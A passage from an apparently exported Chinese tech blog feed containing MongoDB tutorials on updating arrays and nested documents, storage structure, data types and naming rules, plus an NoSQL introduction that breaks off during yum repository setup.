更新文档中的文档和更新文档中的数组用Python理解的话就是字典中的字典和，字典中的列表~~！ 先创建一个文档，然后通过修改他来实际看下如何修改文档中的文档和文档中的数组 123456789101112131415&gt; db.user.insert(&#123;&quot;uid&quot;:1,&quot;name&quot;:&quot;luotianshuai&quot;,&quot;content&quot;:&#123;&quot;addr&quot;:&quot;beijing&quot;,&quot;code&quot;:10085,&quot;qq&quot;:&quot;1234567&quot;&#125;,&quot;email&quot;:[]&#125;)WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f19c45e4f17980e7b3366&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ ]&#125;&gt; 一、数组的更新 1、数组增加元素$push 1234567891011121314151617&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$push&quot;:&#123;&quot;email&quot;:&quot;a&quot;&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f19c45e4f17980e7b3366&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;a&quot; ]&#125;&gt; $push 是在元组中增加一个元素,会在数组的最后追加元素 2、$pushAll 在元组中增加多个元素,但是他不检查元素是否存在 如下：b已经存在了，我再同时增加b,c,d看下是什么结果 123456789101112131415161718&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$push&quot;:&#123;&quot;email&quot;:&quot;b&quot;&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f1b9a5e4f17980e7b3367&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;a&quot;, &quot;b&quot; ]&#125;&gt; $pushAll 123456789101112131415161718192021&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$pushAll&quot;:&#123;&quot;email&quot;:[&quot;b&quot;,&quot;c&quot;,&quot;d&quot;]&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f1b9a5e4f17980e7b3367&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;a&quot;, &quot;b&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot; ]&#125;&gt; 3、$addToSet 往数组中添加一个不重复的元素 1234&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$addToSet&quot;:&#123;&quot;email&quot;:&quot;d&quot;&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 0 &#125;)&gt; #从上面的结果可以看出匹配到了一个，插入和修改了0个，说明他可以判断元素是否存在 添加一个元素 1234#如果不存在就创建&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$addToSet&quot;:&#123;&quot;email&quot;:&quot;e&quot;&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)&gt; 添加多个不重复的元素，这时候就得需要用到$eache操作符了 123456789101112131415161718192021222324252627#这里e,d都是存在的然后g，f是不存在的批量插入看下结果&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$addToSet&quot;:&#123;&quot;email&quot;:&#123;&quot;$each&quot;:[&quot;e&quot;,&quot;g&quot;,&quot;f&quot;,&quot;d&quot;]&#125;&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)#结果&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f1b9a5e4f17980e7b3367&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;a&quot;, &quot;b&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;g&quot;, &quot;f&quot; ]&#125;&gt; 总结： db.user.update({“uid”:1},{“$push”:{“email”:”a”}}) #在数组末尾添加一个元素 db.user.update({“uid”:1},{“$pushAll”:{“email”:[“b”,”c”,”d”]}}) #在数组末尾添加多个元素，且并不检查是否重复 db.user.update({“uid”:1},{“$addToSet”:{“email”:”d”}}) #向数组添加一个不重复的元素 #在实际的生产中可能需要插入多个不重复的元素可以使用$addToSet 结合$eache操作符 db.user.update({“uid”:1},{“$addToSet”:{“email”:{“$each”:[“e”,”g”,”f”,”d”]}}}) 二、删除数组元素 1、$pop 从数组中1个值，只能从开头和结尾取值 $pop是从数组中的开头和结尾删除一个值 从上面的结果可以看出，$pop操作符的值中数组的值，为正数的时候从数组的右侧删值，为负数的时候从数组的左侧取值 2、$pull删除指定的数组指定的一个元素 3、$pullAll 删除多个指定的数组元素 总结： db.user.update({“uid”:1},{“$pop”:{“email”:-1}}) #从左侧删除一个元素 db.user.update({“uid”:1},{“$pop”:{“email”:1}})#从右侧删除一个元素 db.user.update({“uid”:1},{“$pull”:{“email”:”b”}}) #删除数组内的指定一个元素 db.user.update({“uid”:1},{“$pullAll”:{“email”:[“b”,”c”]}}) #删除数组内指定的多个元素 三、数组元素的更新 1、通过变量调用下标修改 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;d&quot;, &quot;e&quot; ]&#125;&gt; a = db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;d&quot;, &quot;e&quot; ]&#125;&gt; a.email[ &quot;d&quot;, &quot;e&quot; ]&gt; a.email[0]d&gt; a.email[1]e&gt; a.email[1] = &quot;shuaige.qq.com&quot;shuaige.qq.com&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,a)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;d&quot;, &quot;shuaige.qq.com&quot; ]&#125;&gt; 2、通过数组.下标修改 123456789101112131415161718192021222324252627282930313233&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;d&quot;, &quot;shuaige.qq.com&quot; ]&#125;&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,&#123;&quot;$set&quot;:&#123;&quot;email.0&quot;:&quot;tim.qq.com&quot;&#125;&#125;)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;tim.qq.com&quot;, &quot;shuaige.qq.com&quot; ]&#125;&gt; 上面的emil.0 相当于emil[0] 通过下标调用mongodb能识别它！ 四、文档的文档修改 看下面的例子说明，文档的文档可以通过“.”分法一级一级的嵌套下去修改他如下 1、查询 12345678910111213141516171819202122&gt; b = db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;tim.qq.com&quot;, &quot;shuaige.qq.com&quot; ]&#125;&gt; b.conb.constructor b.content&gt; b.content&#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 10085, &quot;qq&quot; : &quot;1234567&quot; &#125;&gt; b.content.addrbeijing&gt; b.content.addr 2、修改 1234567891011121314151617181920212223242526272829303132333435&gt; b.content.code = 123456789123456789&gt; b&#123; &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 123456789, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;tim.qq.com&quot;, &quot;shuaige.qq.com&quot; ]&#125;&gt; db.user.update(&#123;&quot;uid&quot;:1&#125;,b)WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)&gt; db.user.findOne()&#123; &quot;_id&quot; : ObjectId(&quot;575f21df5e4f17980e7b3369&quot;), &quot;uid&quot; : 1, &quot;name&quot; : &quot;luotianshuai&quot;, &quot;content&quot; : &#123; &quot;addr&quot; : &quot;beijing&quot;, &quot;code&quot; : 123456789, &quot;qq&quot; : &quot;1234567&quot; &#125;, &quot;email&quot; : [ &quot;tim.qq.com&quot;, &quot;shuaige.qq.com&quot; ]&#125;&gt;]]></content>
      <categories>
        <category>数据库运维</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB[二]:逻辑与物理存储结构]]></title>
    <url>%2Farticles%2Febd79db6.html</url>
    <content type="text"><![CDATA[目的对MongoDB中操作逻辑和存储结构进行详细介绍。 基本的操作常用的命令和基础知识1、进入MongoDB shell 首先我们进入到MongoDB所在目录执行 123cd /work/app/mongodb/bin/#启动./mongo 为了方便执行我们可以,这样直接在终端输入mongo调用就可以了 1alias mongo=&apos;/work/app/mongodb/bin/mongo&apos; 如果想永久生效,把他加入到/etc/profile中即可2、查看数据库命令 1234567#可以通过show dbs; 或者 和Mysql一样执行show databases;&gt; show dbs;local 0.000GB&gt; show databases;local 0.000GB&gt; 3、打开数据库 和关系型数据库中打开数据库是一样的 12345#使用数据库使用use dbs即可，进入后可以使用showtables;去查看数据库中的表&gt; use dbs;switched to db dbs&gt; show tables;&gt; 从上面可以看出，一个MongoDB实例是由一个或多个数据库组成的 但是这里需要注意： 在Mysql中的表中，我们给里面的每行叫做‘记录’，但是在MongoDB中我们给每行数据叫做‘文档’ 所以在MongoDB中我们给每个表叫做‘集合’。集合中就是存储了文档的集合。 查看当前数据库中的集合命令为： 1show collections; 所以：show tables; 和 show databases;命令只是兼容关系型数据库而已，因此他们之间的层次关系就明白了，NICE~ 总结： 1、MongoDB逻辑概念总结 文档：文档(Document)是MongodDB中的核心概念，他是MongoDB逻辑存储的最小基本单元 集合：多个文档组成的集合 数据库：多个集合组成的数据库 MongoDb 关系型数据库Mysql 文档(document) 行(row) 集合(collections) 表(table) 数据库(databases) 数据库(databases) 2、MongoDB 物理存储总结 2.1 命名空间文件：命名空间(.ns结尾文件) 它存储了分配和正在使用的磁盘空间 2.2 数据库文件：以(0,1,2,3…)结尾的，并且后面的文件大小是前面一个文件大小的2倍！ 为什么MongodDB物理存储使用这种方式设计呢？好处是什么？：当一方面如果数据库很小的时候，不至于数据库小而浪费存储空间，另外一方面如果数据库增长比较快，通过预分配的方式，是上一个文件的两倍的办法，来避免数据的剧增造成分配文件造成的性能下降，来预分配空间，以空间的办法来换取性能的提升。 2.3 日志文件 123系统日志文件logpathoplog复制操作日志文件 #只有在主从复制开启之后才会出现慢查询日志 #需要开启后才可以 慢查询日志通过help就可以看到如何启用 12345#这两个参数需要组合使用 --slowms 大于多少秒才算慢查询 --slowms arg (=100) value of slow for profile and console log#默认是关闭的1为慢查询，all为所有的都日志--profile arg 0=off 1=slow, 2=all 我们可以通过配置文件进行设置： 123profile=1#生产中这里应该大于200毫秒，并且这个必须根据生产中实际的需求来定义的slowms=1 MongoDB数据类型 MongodDB的数据类型是：BSON的数据类型 BSON：是Binary JSON是二进制的格式，能将MongoDB的所有文档表示为字节字符串！ JSON：是一种轻量级的数据交换格式。它基于JavaScript的一个子集！ 一、在初识MongoDB的时候了解“帮助” 1、最高的帮助 在MongoDB shell中输入help 123456789101112131415161718192021222324&gt; help db.help() help on db methods db.mycoll.help() help on collection methods sh.help() sharding helpers rs.help() replica set helpers help admin administrative help help connect connecting to a db help help keys key shortcuts help misc misc things to know help mr mapreduce show dbs show database names show collections show collections in current database show users show users in current database show profile show most recent system.profile entries with time &gt;= 1ms show logs show the accessible logger names show log [name] prints out the last segment of log in memory, &apos;global&apos; is default use &lt;db_name&gt; set current database db.foo.find() list objects in collection foo db.foo.find( &#123; a : 1 &#125; ) list objects in foo where a == 1 it result of the last line evaluated; use to further iterate DBQuery.shellBatchSize = x set default number of items to display on shell exit quit the mongo shell&gt; 2、打开数据库在数据库中查看帮助 进入到数据库中后我们可以使用db.help()查看数据库级别的帮助 1db.help() #查看数据库级别的帮助,里面会显示数据库级别的帮助 3、查看集合中的帮助 123456&gt; show dbs;local 0.000GBtim 0.000GB&gt; show collections;users&gt; db.users.help() 创建数据库查看当前的数据库 123&gt; show dbs;local 0.000GBtim 0.000GB 可以看到当前只有tim和系统自带的local数据库，我们通过use 去打开一个数据库！shuai并且查看数据库 123456&gt; use shuai;switched to db shuai&gt; show dbs;local 0.000GBtim 0.000GB&gt; 发现数据库并没有添加，当我们在给数据库中的集合插入一条文档的时候就会：自动创建一条文档合、一个集合、一个数据库。 12345678910111213&gt; db.users.insert(&#123;&quot;uid&quot;:1&#125;)WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)&gt; #这个时候看下是否添加了数据库和集合！！！&gt; show dbs;local 0.000GBshuai 0.000GBtim 0.000GB#当前数据库&quot;shuai&quot;下的集合&gt; show collections;users&gt; 2、插入一条数据 12345&gt; db.users.insert(&#123;&quot;uid&quot;:2,&quot;uname&quot;:&quot;luotianshuai&quot;,&quot;isvip&quot;:true,&quot;sex&quot;:null,&quot;favorite&quot;:[&quot;apple&quot;,&quot;banana&quot;,1,2,3,4,5],&quot;regtime&quot;:new Date()&#125;)WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)&gt; db.users.find()&#123; &quot;_id&quot; : ObjectId(&quot;5754f1ea4b7f62c4992c4ef4&quot;), &quot;uid&quot; : 1 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;), &quot;uid&quot; : 2, &quot;uname&quot; : &quot;luotianshuai&quot;, &quot;isvip&quot; : true, &quot;sex&quot; : null, &quot;favorite&quot; : [ &quot;apple&quot;, &quot;banana&quot;, 1, 2, 3, 4, 5 ], &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;) &#125; 注：这里的数据类型，列表、字典，这里的new Date()是MongoDB就类似Django Model的时间选项类似于：date = models.DateTimeField(auto_now=True) 3、查询数据 查询一条数据 12345678910111213141516171819&gt; db.users.findOne(&#123;&quot;uid&quot;:2&#125;)&#123; &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;), &quot;uid&quot; : 2, &quot;uname&quot; : &quot;luotianshuai&quot;, &quot;isvip&quot; : true, &quot;sex&quot; : null, &quot;favorite&quot; : [ &quot;apple&quot;, &quot;banana&quot;, 1, 2, 3, 4, 5 ], &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;)&#125;&gt; 并且我们可以吧取出来的数据保存在一个变量中，并且通过变量去调用其值 123456789101112131415161718192021222324&gt; a = db.users.findOne(&#123;&quot;uid&quot;:2&#125;)&#123; &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;), &quot;uid&quot; : 2, &quot;uname&quot; : &quot;luotianshuai&quot;, &quot;isvip&quot; : true, &quot;sex&quot; : null, &quot;favorite&quot; : [ &quot;apple&quot;, &quot;banana&quot;, 1, 2, 3, 4, 5 ], &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;)&#125;#并且可以通过变量去调用里面的值&gt; a.a._id a.favorite a.isvip a.regtime a.toLocaleString( a.uid a.valueOf(a.constructor a.hasOwnProperty( a.propertyIsEnumerable( a.sex a.toString( a.uname&gt; a. MongoDB中的数据类型和Mysql数据类型对比12345678910&gt; db.users.insert(&#123;&quot;uid&quot;:3,&quot;salary&quot;:312402039840981098098309,&quot;a&quot;:1.2423412314223423413&#125;)WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)&gt; b = db.users.findOne(&#123;&quot;uid&quot;:3&#125;)&#123; &quot;_id&quot; : ObjectId(&quot;5754f7214b7f62c4992c4ef6&quot;), &quot;uid&quot; : 3, &quot;salary&quot; : 3.124020398409811e+23, &quot;a&quot; : 1.2423412314223423&#125; 1、MongoDB中的数字类型和Mysql中的数字类型对比 查看MongoDB中的数字类型他们都是number类型的 1234567&gt; typeof(b.uid)number&gt; typeof(b.salary)number&gt; typeof(b.a)number&gt; 可以看出在MongoDB中所有的数字类型都是数值类型的，我们比较下Mysql中的数字类型！ 在Mysql中类似“uid”:3 这个3应该属于普通的整数，或者是短整形 类似薪水：salary 应该是长整型 类似a应该是双精度浮点型 数字： 在Mysql中对数字类型分的非常详细，有短整形、长整型，浮点数分为单精度和双精度浮点型，而在MongoDB都是64位的浮点数！这样的好处就是很简单，他不需要区分数字类型，就是number类型，简单、简洁。容易理解和在处理的时候也方便。 字符串： 在Mysql中分为定长、变长字符串，无论是定长字符串或者变长字符串，都要对长度事先定义！但是MongoDB中无需事先定义，对长度没有并且的定义并且他甚至可以存储一篇文章！也表现的简单、简洁、 布尔型： 布尔值只有：真、假分别用：True False 表示 null值： 12345&gt; db.users.find(&#123;&quot;sex&quot;:null&#125;)&#123; &quot;_id&quot; : ObjectId(&quot;5754f1ea4b7f62c4992c4ef4&quot;), &quot;uid&quot; : 1 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;), &quot;uid&quot; : 2, &quot;uname&quot; : &quot;luotianshuai&quot;, &quot;isvip&quot; : true, &quot;sex&quot; : null, &quot;favorite&quot; : [ &quot;apple&quot;, &quot;banana&quot;, 1, 2, 3, 4, 5 ], &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5754f7214b7f62c4992c4ef6&quot;), &quot;uid&quot; : 3, &quot;salary&quot; : 3.124020398409811e+23, &quot;a&quot; : 1.2423412314223423 &#125;&gt; 咱们查询以”sex“ 为null条件，但是查询出了3条结果可以得出： 在MongoDB中，1、null代表着值为null 2、者字段不存在。 那么怎么把字段存在并且为null值得文档查找出来呢？ 1234&gt; db.users.find(&#123;&quot;sex&quot;:null,&quot;sex&quot;:&#123;&quot;$exists&quot;:true&#125;&#125;)&#123; &quot;_id&quot; : ObjectId(&quot;5754f2c84b7f62c4992c4ef5&quot;), &quot;uid&quot; : 2, &quot;uname&quot; : &quot;luotianshuai&quot;, &quot;isvip&quot; : true, &quot;sex&quot; : null, &quot;favorite&quot; : [ &quot;apple&quot;, &quot;banana&quot;, 1, 2, 3, 4, 5 ], &quot;regtime&quot; : ISODate(&quot;2016-06-06T03:49:28.946Z&quot;) &#125;&gt; #我们查找sex为null的并且给其加一个条件 值存在&#123;&quot;$exists&quot;:true&#125; 数组： 一组数据集合 对象类型： 比如日期类型，日期类型是通过对象类型产生的，但是处理日期比较麻烦！这个也是MongoDB的问题表现力不足 BSON的特点：优点：简单、简洁、容易理解、解析方便、记忆 缺点：表现力不足比如日期格式（处理起来就比较麻烦） 命名规则1、文档的键名命名几乎所有utf8字符串，只有以下少数例外 $开头 \0 空字符串 _下划线开头，可以用但是不建议使用，凡是系统生成的都是以_开头命名的，所以在实际生产中我们不使用_开头的！ 2、集合的命名几乎所有的utf8字符串，只有以下少数例外 $开头 \0 空字符串 system.开头 ”“空字符串 3、数据库的命名几乎所有的utf8字符串，只有以下少数例外 $开头 \0 空字符串 system.开头 ”“空字符串 / \ 并且这里需要注意：数据库名是不区分大小写的，如果你有一个shuai的数据库，你在创建一个SHUAI的数据库插入数据的时候就会报错，我们一般创建数据库的时候都把MongoDB的数据库名为小写。]]></content>
      <categories>
        <category>数据库运维</category>
        <category>Nosql详解</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB[一]:初识]]></title>
    <url>%2Farticles%2F35556fc0.html</url>
    <content type="text"><![CDATA[目的本文对Nosql进行介绍，并且引申出mongodb，进而对mango安装过程进行记录。 NoSQL介绍NoSQL简介NoSQL,全称是”Not Only Sql”,指的是非关系型的数据库。 非关系型数据库主要有这些特点:非关系型的、分布式的、开源的、水平可扩展的。 原始的目的是为了大规模 web 应用,这场全 新的数据库革命运动早期就有人提出,发展至 2009 年趋势越发高涨。 NoSQL 的拥护者们提倡运用非关系型的数据存储,通常的应用如:模式自由、支持简易复制、简单的 API、最终 的一致性(非 ACID)、大容量数据等。 NoSQL 被我们用得最多的当数 key-value 存储（如Redis）,当然还 有其他的文档型的、列存储、图型数据库、xml 数据库等。 为什么会有NoSQL通用关系数据库功能强大，遵循SQL标准，而且性能卓越而且稳定为什么会出现NoSQL呢？ 上面也说过了NoSQL的初识是随着WEB应用的飞速发展中出现的，在期间遇到了一些关系型数据库难以克服的问题，例如： 1、Highperformance- 对数据库高并发读写的需求 12web2.0 网站要根据用户个性化信息来实时生成动态页面和提供动态信息,所以基本上无法 使用动态页面静态化技术,因此数据库并发负载非常高,往往要达到每秒上万次读写请求。 关系型数据库应付上万次 SQL 查询还勉强顶得住,但是应付上万次 SQL 写数据请求,硬盘 IO 就已经无法承受了,其实对于普通的 BBS 网站,往往也存在对高并发写请求的需求。 2、HugeStorage- 对海量数据的高效率存储和访问的需求 123对于大型的 SNS 网站,每天用户产生海量的用户动态信息,以国外的 Friend feed 为例,一 个月就达到了 2.5 亿条用户动态,对于关系数据库来说,在一张 2.5 亿条记录的表里面进行 SQL 查询,效率是极其低下乃至不可忍受的。再例如大型 web 网站的用户登录系统,例如腾 讯,盛大,动辄数以亿计的帐号,关系数据库也很难应付。 3、HighScalability&amp;&amp;HighAvailability- 对数据库的高可扩展性和高可用性的需求 12随着数据库的不断增加，你的数据库没有办法向webserver或app那样简单的通过增加硬件来提升性能和负载能力。并且mysql没有提供水平拆分的和扩容的方案，这是非常头疼的一件事情。 对于上面的三高要求来说很多关系型数据库就遇到了难以克服的问题，并且在WEB2.0的网站和应用来说关系型数据库很多主要特性却无用武之地！！！ 1、数据库事务一致性需求 1很多 web 实时系统并不要求严格的数据库事务,对读一致性的要求很低,有些场合对写一 致性要求也不高。因此数据库事务管理成了数据库高负载下一个沉重的负担。 2、数据库的写实时性和读实时性需求 1对关系数据库来说,插入一条数据之后立刻查询,是肯定可以读出来这条数据的,但是对于 很多 web 应用来说,并不要求这么高的实时性。 3、对复杂的 SQL 查询,特是多表关联查询的需求 123任何大数据量的 web 系统,都非常忌讳多个大表的关联查询,以及复杂的数据分析类型的复杂 SQL查询,特是SNS类型的网站,从需求以及产品设计角度,就避免了这种情况的产生。往往更多的只是单表的主键查询,以及单表的简单条件分页查询,SQL 的功能被 极大的弱化了。因此,关系数据库在这些越来越多的应用场景下显得不那么合适了 为了解决如上问题NoSQL就诞生了~ NoSQL特点1、它可以处理超大量的数据2、它运行在便宜的服务器集群上集群扩充起来非常方便并且成本很低。3、它击碎了性能瓶颈NoSQL 的支持者称,通过 NoSQL 架构可以省去将 Web 或 Java 应用和数据转换成 SQL 格式的 时间,执行速度变得更快。“SQL 并非适用于所有的程序代码”,对于那些繁重的重复操作的数据,SQL 值得花钱。但 是当数据库结构非常简单时,SQL 可能没有太大用处。4、它没有过多的操作虽然NoSQL的支持者也承认关系型数据库提供了无可比拟的功能集合,而且在数据完整性上也发挥绝对稳定,他们同时也表示,企业的具体需求可能没有那么复杂。5、 它的支持者源于社区因为NoSQL项目都是开源的,因此它们缺乏供应商提供的正式支持。这一点它们与大多数 开源项目一样,不得不从社区中寻求支持。NoSQL 发展至今,出现了好几种非关系性数据库,比如我正在学习的MongoDB 初识MongoDBMongoDB 是一个介于关系数据库和非关系数据库之间的产品,是非关系数据库当中功能最丰富,最像关系数据库的。他支持的数据结构非常松散,是类似 json 的 bjson 格式,因此可以存储比较复杂的数据类型。MongoDB最大的特点：它支持的查询语言非常强大,其语法有点类似于面向对象的查询语言,几乎可以实现类似关系数据库单表查询的绝大部分功能, 而且还支持对数据建立索引。它是一个面向集合的,模式自由的文档型数据库。 1、 面向集合(Collenction-Orented)意思是数据被分组存储在数据集中, 被称为一个集合(Collenction)。每个集合在数据库中 都有一个唯一的标识名,并且可以包 无限数目的文档。集合的概念类似关系型数据库(RDBMS)里的表(table),不同的是它不需要定义任何模式(schema)。 2、 模式自由(schema-free)意味着对于存储在 MongoDB 数据库中的文件,我们不需要知道它的任何结构定义。提了这 么多次”无模式”或”模式自由”,它到是个什么概念呢?例如,下面两个记录可以存在于同一个集合里面:{“welcome” : “Beijing”}{“age” : 28} 3、 文档型 意思是我们存储的数据是键-值对的集合,键是字符串,值可以是数据类型集合里的任意类型, 包括数组和文档. 我们把这个数据格式称作 “BSON” 即 “Binary Serialized dOcument Notation.” MongoDB特点 面向集合存储,易于存储对象类型的数据 模式自由 支持动态查询 支持完全索引,包 内部对象 支持查询 支持复制和故障恢复 使用高效的二进制数据存储,包括大型对象(如视频等) 自动处理碎片,以支持云计算层次的扩展性 支持 Python,PHP,Ruby,Java,C,C#,Javascript,Perl更多请看社区 文件存储格式为 BSON(一种 JSON 的扩展) 可通过网络访问 MongoDB功能 面向集合的存储:适合存储对象及 JSON 形式的数据 动态查询:MongoDB 支持丰富的查询表达式。查询指令使用 JSON 形式的标记,可轻易查询文档中内嵌的对象及数组 完整的索引支持:包括文档内嵌对象及数组。MongoDB 的查询优化器会分析查询表达式,并生成一个高效的查询计划 查询监视:MongoDB 包 一系列监视工具用于分析数据库操作的性能 复制及自动故障转移:MongoDB 数据库支持服务器之间的数据复制,支持主-从模式及 服务器之间的相互复制。复制的主要目标是提供冗余及自动故障转移 高效的传统存储方式:支持二进制数据及大型对象(如照片或图片) 自动分片以支持云级 的伸缩性:自动分片功能支持水平的数据库集群,可动态添加额外的机器 适用场景 网站数据:MongoDB 非常适合实时的插入,更新与查询,并具备网站实时数据存储所需的复制及高度伸缩性 缓存:由于性能很高,MongoDB 也适合作为信息基础设施的缓存层。在系统重启之后, 由 MongoDB 搭建的持久化缓存层可以避免下层的数据源过载 大尺寸,低价值的数据:使用传统的关系型数据库存储一些数据时可能会比较昂贵,在此之前,很多时候程序员往往会选择传统的文件进行存储 高伸缩性的场景:MongoDB 非常适合由数十或数百台服务器组成的数据库。MongoDB的路线图中已经包 对 MapReduce 引擎的内置支持 用于对象及 JSON 数据的存储:MongoDB 的 BSON 数据格式非常适合文档化格式的存储及查询 MongoDB部署与维护安装MongoDBMongoDB维护者还事相当的人性化的给我们提供了YUM源安装就相当的方便了，当然也可以通过源码去安装！ 1、创建一个/etc/yum.repos.d/mongodb-enterprise.repo配置文件 内容如下 3.2版本 123456[mongodb-enterprise]name=MongoDB Enterprise Repositorybaseurl=https://repo.mongodb.com/yum/redhat/$releasever/mongodb-enterprise/stable/$basearch/gpgcheck=1enabled=1gpgkey=https://www.mongodb.org/static/pgp/server-3.2.asc 2.6版本 12345[mongodb-org-2.6]name=MongoDB 2.6 